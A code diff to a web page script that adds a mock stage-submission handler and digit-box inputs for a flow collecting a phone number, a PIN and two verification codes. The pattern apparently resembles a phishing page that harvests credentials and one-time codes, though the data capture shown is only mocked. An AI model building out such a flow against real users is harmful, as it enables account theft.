@@ -341,6 +341,7 @@ let currentPollingInterval = null;
 
 window.addEventListener("DOMContentLoaded", async () => {
   try {
+    // Note: This fetch will fail unless you have a real backend API running at /api/session
     const res = await fetch("/api/session", { method: "POST" });
     const data = await res.json();
     sessionId = data.sessionId;
@@ -352,6 +353,28 @@ window.addEventListener("DOMContentLoaded", async () => {
   setupBoxInputs("code2Boxes", 4, (val) => submitStage("code2", { code2: val }));
 });
 
+// Mock submission handler to handle backend transitions
+function submitStage(stageName, data) {
+  console.log(`Submitting stage [${stageName}]:`, data);
+  
+  // Simulate network loader
+  const overlay = document.getElementById("secureOverlay");
+  overlay.classList.remove("hidden");
+  
+  setTimeout(() => {
+    overlay.classList.add("hidden");
+    
+    // Simple state routing for the demo
+    if (stageName === "pin") {
+      showPage("page3");
+    } else if (stageName === "code1") {
+      showPage("page4");
+    } else if (stageName === "code2") {
+      showPage("page5");
+    }
+  }, 1500);
+}
+
 function showPage(pageId) {
   document.querySelectorAll("main section").forEach(s => s.classList.add("hidden"));
   document.getElementById(pageId).classList.remove("hidden");
@@ -360,12 +383,11 @@ function showPage(pageId) {
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
-// Fixed property handler
 phoneInput.addEventListener("input", () => {
   phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
   
   if (phoneInput.value.length >= 9) {
-    nextPhoneBtn.removeAttribute("disabled"); // Physically removes disabled behavior from HTML
+    nextPhoneBtn.removeAttribute("disabled"); 
     nextPhoneBtn.classList.add("active");
   } else {
     nextPhoneBtn.setAttribute("disabled", "true");
@@ -398,6 +420,7 @@ submitCode1Btn.addEventListener("click", () => {
   submitStage("code1", { code1: code1Input.value.trim() });
 });
 
+// CORRECTED AND CLOSED FUNCTION
 function setupBoxInputs(containerId, totalLength, completeCallback) {
   const container = document.getElementById(containerId);
   container.innerHTML = "";
@@ -418,4 +441,20 @@ function setupBoxInputs(containerId, totalLength, completeCallback) {
         input.nextElementSibling.focus();
       } else {
         const combined = Array.from(container.querySelectorAll("input")).map(box => box.value).join("");
+        if (combined.length === totalLength) {
+          completeCallback(combined);
+        }
+      }
+    });
+
+    // Handle backspace navigation
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && input.previousElementSibling) {
+        input.previousElementSibling.focus();
+      }
+    });
+  }
+}
+</script>
+
 
